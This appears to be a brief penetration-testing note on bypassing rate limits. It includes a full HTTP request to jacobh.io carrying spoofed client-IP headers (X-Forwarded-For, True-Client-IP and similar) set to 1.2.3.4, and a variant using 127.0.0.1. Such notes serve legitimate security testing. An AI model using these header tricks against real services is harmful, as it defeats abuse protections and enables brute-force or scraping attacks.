___
### Identify rate limiting technique
Potential:
- Headers?
- User agents?
- Cookies? Session tokens?
- HTTP verb tamperng?
- Decrease amount and speed of requests?

**Quick win headers:**
```
X-Real-IP:
X-Forwarded-For:
X-Originating-IP:
Client-IP:
True-Client-IP:
```
1st, get yourself rate limited, then send a request with these headers, check bypass
```
POST / HTTP/2
Host: jacobh.io
Sec-Ch-Ua: "Not?A_Brand";v="99", "Chromium";v="130"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
X-Real-IP: 1.2.3.4
X-Forwarded-For: 1.2.3.4
X-Originating-IP: 1.2.3.4
Client-IP: 1.2.3.4
True-Client-IP: 1.2.3.4
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```
Also try localhost
```
X-Real-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
```
